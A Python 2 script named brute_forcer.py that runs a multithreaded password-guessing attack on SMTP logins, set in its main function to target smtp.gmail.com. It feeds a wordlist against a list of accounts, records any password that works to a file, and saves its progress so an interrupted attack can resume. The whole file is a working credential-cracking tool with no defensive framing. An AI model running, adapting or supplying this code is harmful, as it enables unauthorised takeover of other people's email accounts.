#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  brute_forcer.py
#  
#  Copyright 2013 Moustafa <Moustafa@LAPTOP>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  

import Queue
import threading
import time
import datetime
import traceback
import atexit
import sys
def status(s):
    sys.stdout.write(s + " " * (78 - len(s)) + "\r")
    
    
def save_state():
    resfile = open('data/index.txt', 'w+')
    resfile.write(str(currIndex))
    resfile.close()



from smtp_connection import SMTPConnection
exitFlag = 0
currIndex= 0
last_currIndex=0

def save_password(account,password):
	resfile = open('data/'+account+'.txt', 'w+')
	resfile.write(password + "  " +str(datetime.datetime.now()))
	resfile.close()
	
class connectionThread (threading.Thread):
    def __init__(self,server,port,accounts, q):
        threading.Thread.__init__(self)
        self.q = q
        self.accounts=accounts
        self.smtpConnection=SMTPConnection(server,port)
        
    def run(self):
		try:
			while 1:
				curr_password=self.q.get().replace('\n','')
				if len(curr_password)>30:
					continue
				for account in self.accounts:
					account=account.replace('\n','')
					#print "trying ",curr_password ," for ", account
					if self.smtpConnection.Test_Credentials(account,curr_password):
						print "Password Found For Account : ",account, " : ",curr_password
						save_password(account,curr_password)
				#time.sleep(0.2)
				self.q.task_done()
				global currIndex,last_currIndex
				last_currIndex=last_currIndex+1
				status("Tried "+str(last_currIndex)+" passwords , current password is : "+curr_password)
				if last_currIndex-currIndex>=100:
					currIndex=last_currIndex
					save_state()
		except:
			print traceback.format_exc()
			print "error"
			pass




class BruteForcer:
	''' 
	
	'''
	def __init__(self,server,port,num_threads,accounts,dictionary_path,start):
		self.server=server
		self.port=port
		self.num_threads=num_threads
		self.start=start
		self.dictionary_path=dictionary_path
		self.accounts=accounts
		global currIndex,last_currIndex
		currIndex=self.start
		last_currIndex=self.start
		self.startAttack()
		
		
	def startAttack(self):
		queue = Queue.Queue()
		print "LOADING Dictionary ..."
		dictionary_lines=open(self.dictionary_path).readlines()
		accounts=open(self.accounts).readlines()		
		for i in range(self.start,len(dictionary_lines)):
			queue.put(dictionary_lines[i])
		print "LOADING Dictionary DONE :) "	
		for i in range (self.num_threads):
			t = connectionThread(self.server,self.port,accounts,queue)
			t.setDaemon(True)
			t.start()
		queue.join()





def main():
	B=BruteForcer('smtp.gmail.com',587,10,"accounts.txt","t.txt",2)
	return 0

if __name__ == '__main__':
	main()

